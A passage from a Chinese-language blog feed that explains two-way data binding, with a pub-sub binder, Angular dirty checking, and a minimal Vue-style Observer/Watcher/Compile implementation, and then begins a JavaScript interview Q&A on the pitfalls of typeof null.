订阅事件</span></span></span><br><span class="line"><span class="javascript">        on:<span class="function"><span class="keyword">function</span>(<span class="params">msg, callback</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">this</span>.callbacks[msg] = <span class="keyword">this</span>.callbacks[msg] || [];</span></span><br><span class="line"><span class="javascript">            <span class="keyword">this</span>.callbacks[msg].push(callback);</span></span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">// 发布事件</span></span></span><br><span class="line"><span class="javascript">        publish: <span class="function"><span class="keyword">function</span>(<span class="params">msg</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">this</span>.callbacks[msg] = <span class="keyword">this</span>.callbacks[msg] || [];</span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>, len=<span class="keyword">this</span>.callbacks[msg].length; i&lt;len; i++)&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">this</span>.callbacks[msg][i].apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line"><span class="javascript">    data_attr = <span class="string">"data-bind-"</span> + object_id,</span></span><br><span class="line"><span class="javascript">    message = object_id + <span class="string">":input"</span>,</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">  changeHandler = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> target = evt.target || evt.srcElemnt, <span class="comment">//IE8兼容</span></span></span><br><span class="line">    prop_name = target.getAttribute(data_attr);</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span>(prop_name &amp;&amp; prop_name !== <span class="string">""</span>)&#123;</span></span><br><span class="line">      pubSub.publish(message, prop_name, target.value);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line"><span class="javascript">  <span class="comment">//监听变化事件并代理到PubSub</span></span></span><br><span class="line"><span class="javascript">  <span class="keyword">if</span>(<span class="built_in">document</span>.addEventListener)&#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.addEventListener(<span class="string">"input"</span>,changeHandler,<span class="literal">false</span>);</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">  <span class="comment">//PubSub将变化传播到所有绑定元素</span></span></span><br><span class="line"><span class="javascript">  pubSub.on(message,<span class="function"><span class="keyword">function</span>(<span class="params">vet,prop_name,new_val</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> elements = <span class="built_in">document</span>.querySelectorAll(<span class="string">"["</span> + data_attr + <span class="string">"="</span> + prop_name + <span class="string">"]"</span>),</span></span><br><span class="line">    tah_name;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>,len =elements.length; i &lt; len; i++)&#123;</span></span><br><span class="line">      tag_name = elements[i].tagName.toLowerCase();</span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span>(tag_name === <span class="string">"input"</span> || tag_name === <span class="string">"textarea"</span> || tag_name === <span class="string">"select"</span>)&#123;</span></span><br><span class="line">        elements[i].value = new_val;</span><br><span class="line"><span class="javascript">      &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line">        elements[i].innerHTML = new_val;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line"><span class="javascript">  <span class="keyword">return</span> pubSub;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">User</span>(<span class="params">uid</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"> <span class="keyword">var</span> binder = <span class="keyword">new</span> DataBinder(uid),</span></span><br><span class="line">  user = &#123;</span><br><span class="line">   atttibutes: &#123;&#125;,</span><br><span class="line"></span><br><span class="line"><span class="javascript">   <span class="comment">//属性设置器使用数据绑定器PubSub来发布变化</span></span></span><br><span class="line"><span class="javascript">   <span class="keyword">set</span>: function(attr_name,val)&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">this</span>.atttibutes[attr_name] = val;</span></span><br><span class="line"><span class="javascript">    <span class="comment">//使用“publish”方法</span></span></span><br><span class="line"><span class="javascript">    binder.publish(uid+ <span class="string">":input"</span>, attr_name, val,<span class="keyword">this</span>);</span></span><br><span class="line">   &#125;,</span><br><span class="line"></span><br><span class="line"><span class="javascript">   <span class="keyword">get</span>: function(attr_name)&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="keyword">this</span>.atttibutes[attr_name];</span></span><br><span class="line">   &#125;,</span><br><span class="line"></span><br><span class="line">   binder: binder</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line"><span class="javascript"> binder.on(uid +<span class="string">":input"</span>,<span class="function"><span class="keyword">function</span>(<span class="params">vet,attr_name,new_val,initiator</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">if</span>(initiator !== user)&#123;</span></span><br><span class="line">   user.set(attr_name,new_val);</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript"> <span class="keyword">return</span> user;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> user = <span class="keyword">new</span> User(<span class="number">123</span>);</span></span><br><span class="line"><span class="javascript">user.set(<span class="string">"name"</span>,<span class="string">"Wolfgang"</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="脏值检查（angular-js）"><a href="#脏值检查（angular-js）" class="headerlink" title="脏值检查（angular.js）"></a>脏值检查（angular.js）</h3><p>angular.js 是通过脏值检测的方式比对数据是否有变更，来决定是否更新视图，最简单的方式就是通过 setInterval() 定时轮询检测数据变动，angular只有在指定的事件触发时进入脏值检测，大致如下：</p><ul><li>DOM事件，譬如用户输入文本，点击按钮等。( ng-click )</li><li>XHR响应事件 ( $http )</li><li>浏览器Location变更事件 ( $location )</li><li>Timer事件( $timeout , $interval )</li><li>执行 $digest() 或 $apply()</li></ul><h3 id="数据劫持（Vue-js）"><a href="#数据劫持（Vue-js）" class="headerlink" title="数据劫持（Vue.js）"></a>数据劫持（Vue.js）</h3><p>vue.js 则是采用数据劫持结合发布者-订阅者模式的方式，通过Object.defineProperty()来劫持各个属性的setter，getter，在数据变动时发布消息给订阅者，触发相应的监听回调。</p><h2 id="官方介绍"><a href="#官方介绍" class="headerlink" title="官方介绍"></a>官方介绍</h2><p>vue当前使用的版本为v2.5.2，<a href="https://cn.vuejs.org/v2/guide/reactivity.html" target="_blank" rel="noopener">官方文档</a>的相关内容是关于深入响应式原理。</p><blockquote><p>当你把一个普通的 JavaScript 对象传给 Vue 实例的 data 选项，Vue 将遍历此对象所有的属性，并使用 Object.defineProperty 把这些属性全部转为 getter/setter。Object.defineProperty 是 ES5 中一个无法 shim 的特性，这也就是为什么 Vue 不支持 IE8 以及更低版本浏览器。<br>这些 getter/setter 对用户来说是不可见的，但是在内部它们让 Vue 追踪依赖，在属性被访问和修改时通知变化。这里需要注意的问题是浏览器控制台在打印数据对象时 getter/setter 的格式化并不同，所以你可能需要安装 vue-devtools 来获取更加友好的检查接口。<br>每个组件实例都有相应的 watcher 实例对象，它会在组件渲染的过程中把属性记录为依赖，之后当依赖项的 setter 被调用时，会通知 watcher 重新计算，从而致使它关联的组件得以更新。</p></blockquote><p><img src="../images/vue_data.png" alt="vue_data.png"></p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><h3 id="原理实现"><a href="#原理实现" class="headerlink" title="原理实现"></a>原理实现</h3><p>当<code>EventListener</code>监听的事件触发，状态发生改变时，通过<code>Object.defineProperty</code>的<code>get/set</code>拦截事件，从而实现数据的双向绑定。</p><p>关于<code>Object.defineProperty</code>可在<a href="http://luckyp.top/高程笔记-对象1">高程笔记-对象1</a>有简单介绍，也可在<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty" target="_blank" rel="noopener">MDN</a>查看。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"input"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"output"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"app.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* app.js */</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(obj, <span class="string">"data"</span>, &#123;</span><br><span class="line">    <span class="keyword">get</span>: function () &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"get"</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="keyword">set</span>: function (newValue) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"set:"</span>+newValue)</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">"input"</span>).value = newValue</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">"output"</span>).innerText = newValue</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"input"</span>).addEventListener(<span class="string">'keyup'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">    obj.data = event.target.value</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="简单实现"><a href="#简单实现" class="headerlink" title="简单实现"></a>简单实现</h3><p>实现双向绑定，需要实现</p><ul><li>数据监听器Observer，能够对数据对象的所有属性进行监听，如有变动可拿到最新值并通知订阅者</li><li>指令解析器Compile，对每个元素节点的指令进行扫描和解析，根据指令模板替换数据，以及绑定相应的更新函数</li><li>Watcher，作为连接Observer和Compile的桥梁，能够订阅并收到每个属性变动的通知，执行指令绑定的相应回调函数，从而更新视图</li><li>入口函数</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>  <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>simple vue<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">v-model</span>=<span class="string">"text"</span>&gt;</span></span><br><span class="line">    &#123;&#123;text&#125;&#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">　　<span class="function"><span class="keyword">function</span> <span class="title">Compile</span>(<span class="params">node, vm</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span>(node) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">this</span>.$frag = <span class="keyword">this</span>.nodeToFragment(node, vm);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="keyword">this</span>.$frag;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Compile.prototype = &#123;</span><br><span class="line"><span class="javascript">      nodeToFragment: <span class="function"><span class="keyword">function</span>(<span class="params">node, vm</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> self = <span class="keyword">this</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> frag = <span class="built_in">document</span>.createDocumentFragment();</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> child;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="keyword">while</span>(child = node.firstChild) &#123;</span></span><br><span class="line">          self.compileElement(child, vm);</span><br><span class="line"><span class="javascript">          frag.append(child); <span class="comment">// 将所有子节点添加到fragment中</span></span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> frag;</span></span><br><span class="line">      &#125;,</span><br><span class="line"><span class="javascript">      compileElement: <span class="function"><span class="keyword">function</span>(<span class="params">node, vm</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> reg = <span class="regexp">/\&#123;\&#123;(.*)\&#125;\&#125;/</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//节点类型为元素</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(node.nodeType === <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">var</span> attr = node.attributes;</span></span><br><span class="line"><span class="javascript">          <span class="comment">// 解析属性</span></span></span><br><span class="line"><span class="javascript">          <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; attr.length; i++ ) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span>(attr[i].nodeName == <span class="string">'v-model'</span>) &#123;</span></span><br><span class="line"><span class="javascript">              <span class="keyword">var</span> name = attr[i].nodeValue; <span class="comment">// 获取v-model绑定的属性名</span></span></span><br><span class="line"><span class="javascript">              node.addEventListener(<span class="string">'input'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">// 给相应的data属性赋值，进而触发该属性的set方法</span></span></span><br><span class="line">                 vm[name]= e.target.value;</span><br><span class="line">              &#125;);</span><br><span class="line"><span class="javascript">              <span class="comment">// node.value = vm[name]; // 将data的值赋给该node</span></span></span><br><span class="line"><span class="javascript">              <span class="keyword">new</span> Watcher(vm, node, name, <span class="string">'value'</span>);</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="comment">//节点类型为text</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(node.nodeType === <span class="number">3</span>) &#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">if</span>(reg.test(node.nodeValue)) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> name = <span class="built_in">RegExp</span>.$<span class="number">1</span>; <span class="comment">// 获取匹配到的字符串</span></span></span><br><span class="line">            name = name.trim();</span><br><span class="line"><span class="javascript">            <span class="comment">// node.nodeValue = vm[name]; // 将data的值赋给该node</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">new</span> Watcher(vm, node, name, <span class="string">'nodeValue'</span>);</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">Dep</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.subs = [];</span></span><br><span class="line">    &#125;</span><br><span class="line">    Dep.prototype = &#123;</span><br><span class="line"><span class="javascript">      addSub: <span class="function"><span class="keyword">function</span>(<span class="params">sub</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">this</span>.subs.push(sub);</span></span><br><span class="line">      &#125;,</span><br><span class="line"><span class="javascript">      notify: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">this</span>.subs.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">sub</span>) </span>&#123;</span></span><br><span class="line">          sub.update();</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">Watcher</span>(<span class="params">vm, node, name, type</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      Dep.target = <span class="keyword">this</span>;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.name = name;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.node = node;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.vm = vm;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.type = type;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.update();</span></span><br><span class="line"><span class="javascript">      Dep.target = <span class="literal">null</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Watcher.prototype = &#123;</span><br><span class="line"><span class="javascript">      update: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">this</span>.get();</span></span><br><span class="line"><span class="javascript">        <span class="keyword">this</span>.node[<span class="keyword">this</span>.type] = <span class="keyword">this</span>.value; <span class="comment">// 订阅者执行相应操作</span></span></span><br><span class="line">      &#125;,</span><br><span class="line"><span class="javascript">      <span class="comment">// 获取data的属性值</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">get</span>: function() &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">this</span>.value = <span class="keyword">this</span>.vm[<span class="keyword">this</span>.name]; <span class="comment">//触发相应属性的get</span></span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">defineReactive</span> (<span class="params">obj, key, val</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> dep = <span class="keyword">new</span> Dep();</span></span><br><span class="line"><span class="javascript">      <span class="built_in">Object</span>.defineProperty(obj, key, &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">get</span>: function() &#123;</span></span><br><span class="line"><span class="javascript">           <span class="comment">//添加订阅者watcher到主题对象Dep</span></span></span><br><span class="line"><span class="javascript">          <span class="keyword">if</span>(Dep.target) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// JS的浏览器单线程特性，保证这个全局变量在同一时间内，只会有同一个监听器使用</span></span></span><br><span class="line">            dep.addSub(Dep.target);</span><br><span class="line">          &#125;</span><br><span class="line"><span class="javascript">          <span class="keyword">return</span> val;</span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="keyword">set</span>: function (newVal) &#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">if</span>(newVal === val) <span class="keyword">return</span>;</span></span><br><span class="line">          val = newVal;</span><br><span class="line"><span class="javascript">          <span class="built_in">console</span>.log(val);</span></span><br><span class="line"><span class="javascript">          <span class="comment">// 作为发布者发出通知</span></span></span><br><span class="line">          dep.notify();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">observe</span>(<span class="params">obj, vm</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">Object</span>.keys(obj).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">key</span>) </span>&#123;</span></span><br><span class="line">        defineReactive(vm, key, obj[key]);</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript"> 　 <span class="function"><span class="keyword">function</span> <span class="title">Vue</span>(<span class="params">options</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">this</span>.data = options.data;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> data = <span class="keyword">this</span>.data;</span></span><br><span class="line"><span class="javascript">      observe(data, <span class="keyword">this</span>);</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> id = options.el;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> dom =<span class="keyword">new</span> Compile(<span class="built_in">document</span>.getElementById(id),<span class="keyword">this</span>);</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 编译完成后，将dom返回到app中</span></span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.getElementById(id).appendChild(dom);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">      el: <span class="string">'app'</span>,</span></span><br><span class="line">      data: &#123;</span><br><span class="line"><span class="javascript">        text: <span class="string">'hello world'</span></span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>参考链接<br><a href="http://www.html-js.com/article/Study-of-twoway-data-binding-JavaScript-talk-about-JavaScript-every-day" target="_blank" rel="noopener">http://www.html-js.com/article/Study-of-twoway-data-binding-JavaScript-talk-about-JavaScript-every-day</a><br><a href="https://segmentfault.com/a/1190000006599500" target="_blank" rel="noopener">https://segmentfault.com/a/1190000006599500</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前段时间的react项目，通过最近的闲暇时间，重构了一版&lt;a href=&quot;http://luckyp.top/vue-cnode/&quot;&gt;vue的PC版本&lt;/a&gt;，&lt;a href=&quot;https://vcnode.luckyp.top/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;备用链接&lt;/a&gt;,对于vue的数据双向绑定产生，探讨一下。&lt;/p&gt;
    
    </summary>
    
      <category term="vue" scheme="https://luckyp.top/categories/vue/"/>
    
    
      <category term="vue" scheme="https://luckyp.top/tags/vue/"/>
    
      <category term="源码" scheme="https://luckyp.top/tags/%E6%BA%90%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript基本面试问题和解答</title>
    <link href="https://luckyp.top/JavaScript%E5%9F%BA%E6%9C%AC%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E5%92%8C%E8%A7%A3%E7%AD%94/"/>
    <id>https://luckyp.top/JavaScript基本面试问题和解答/</id>
    <published>2018-05-26T16:00:00.000Z</published>
    <updated>2018-05-26T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>有关于JavaScript的基本面试问题和解答。<br><a id="more"></a></p><h2 id="使用typeof-bar-“object”来确定bar是否是一个对象时有什么潜在的缺陷？这个陷阱如何避免"><a href="#使用typeof-bar-“object”来确定bar是否是一个对象时有什么潜在的缺陷？这个陷阱如何避免" class="headerlink" title="使用typeof bar ===“object”来确定bar是否是一个对象时有什么潜在的缺陷？这个陷阱如何避免"></a>使用typeof bar ===“object”来确定bar是否是一个对象时有什么潜在的缺陷？这个陷阱如何避免</h2><p>虽然typeof bar === “object” 是检查是否一种可靠的方法bar是一个对象，在JavaScript中令人惊讶的小问题，就是null在还考虑的对象！</p><p>因此，对于大多数开发人员来说，下面的代码会将真实（而不是错误）记录到控制台：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bar = <span class="literal">null</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> bar === <span class="string">"object"</span>);  <span class="comment">// logs true!</span></span><br></pre></td></tr></table></figure><p>只要是意识到了这一点，这个问题可以很容易地通过检查也避免了如果bar是null：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log((bar !== <span class="literal">null</span>) &amp;&amp; (<span class="keyword">typeof</span> bar === <span class="string">"object"</span>));  <span class="comment">// logs false</span></span><br></pre></td></tr></table></figure><p>为了让答案更加完整，还有两件事值得注意：</p><p>首先，如果bar是一个函数，上面的解决方案将返回false。在大多数情况下，这是所期望的行为，但是在您希望函数返回true的情况下，您可以将上述解决方案修改为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log((bar !== <span class="literal">null</span>) &amp;&amp; ((<span class="keyword">typeof</span> bar === <span class="string">"object"</span>) || (<span class="keyword">typeof</span> bar === <span class="string">"function"</span>)));</span><br></pre></td></tr></table></figure><p>其次，如果bar是数组，则上述解决方案将返回true（例如，如果var bar = [];）。在大多数情况下，这是所需的行为，因为数组确实是对象，但是在需要false数组的情况下，可以将上述解决方案修改为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log((bar !== <span class="literal">null</span>) &amp;&amp; (<span class="keyword">typeof</span> bar === <span class="string">"object"</span>) 